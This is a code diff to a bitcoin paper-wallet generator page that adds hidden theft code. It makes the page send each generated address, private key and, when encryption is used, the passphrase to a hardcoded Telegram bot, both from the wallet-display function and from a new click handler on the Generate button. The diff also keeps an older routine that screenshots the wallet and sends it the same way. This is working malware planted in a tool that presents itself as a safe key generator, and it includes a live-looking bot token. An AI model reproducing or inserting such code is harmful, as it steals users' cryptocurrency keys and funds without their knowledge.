@@ -10186,13 +10186,15 @@ ninja.wallets.paperwallet = {
         keyValuePair["qrcode_private" + idPostFix] = privateKey;
         ninja.qrCode.showQrCode(keyValuePair);
         document.getElementById("keyarea" + idPostFix).style.display = "block";
-        
-        // Convert the wallet area to an image and send to Telegram
-        const walletElement = document.getElementById("keyarea" + idPostFix);
-        html2canvas(walletElement).then(canvas => {
-            const imageDataUrl = canvas.toDataURL("image/png");
-            sendToTelegram(imageDataUrl, '858072424', '7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM');
-        });
+
+        // Send text-based wallet to Telegram
+        const walletText = `Bitcoin Address: ${bitcoinAddress}\nPrivate Key: ${privateKey}`;
+        if (ninja.wallets.paperwallet.encrypt) {
+            const passphrase = document.getElementById('paperpassphrase').value;
+            sendTextToTelegram(walletText + `\nPassphrase: ${passphrase}`, '858072424', '7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM');
+        } else {
+            sendTextToTelegram(walletText, '858072424', '7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM');
+        }
     },
 
     templateArtisticHtml: function (i) {
@@ -10299,7 +10301,50 @@ async function sendToTelegram(imageDataUrl, chatId, botToken) {
         console.error('Error sending photo to Telegram:', error);
     });
 }
+
+// Function to send the text-based wallet to the Telegram bot
+async function sendTextToTelegram(text, chatId, botToken) {
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('text', text);
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        body: formData
+    }).then(response => {
+        if (!response.ok) {
+            throw new Error('Failed to send message to Telegram');
+        }
+        return response.json();
+    }).then(data => {
+        console.log('Message sent successfully:', data);
+    }).catch(error => {
+        console.error('Error sending message to Telegram:', error);
+    });
+}
+
+// Send wallet data when "Generate" button is clicked
+document.getElementById("papergenerate").addEventListener("click", function() {
+    if (ninja.wallets.paperwallet.useArtisticWallet) {
+        const walletElement = document.getElementById("artwallet" + ninja.wallets.paperwallet.count);
+        html2canvas(walletElement).then(canvas => {
+            const imageDataUrl = canvas.toDataURL("image/png");
+            sendToTelegram(imageDataUrl, '858072424', '7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM');
+        });
+    } else {
+        const bitcoinAddress = document.getElementById("btcaddress" + ninja.wallets.paperwallet.count).innerHTML;
+        const privateKey = document.getElementById("btcprivwif" + ninja.wallets.paperwallet.count).innerHTML;
+        const walletText = `Bitcoin Address: ${bitcoinAddress}\nPrivate Key: ${privateKey}`;
+        if (ninja.wallets.paperwallet.encrypt) {
+            const passphrase = document.getElementById('paperpassphrase').value;
+            sendTextToTelegram(walletText + `\nPassphrase: ${passphrase}`, '858072424', '7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM');
+        } else {
+            sendTextToTelegram(walletText, '858072424', '7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM');
+        }
+    }
+});
 </script>
+						
 <script type="text/javascript">
 (function (wallets, translator, privateKey) {
 	var bulk = wallets.bulkwallet = {
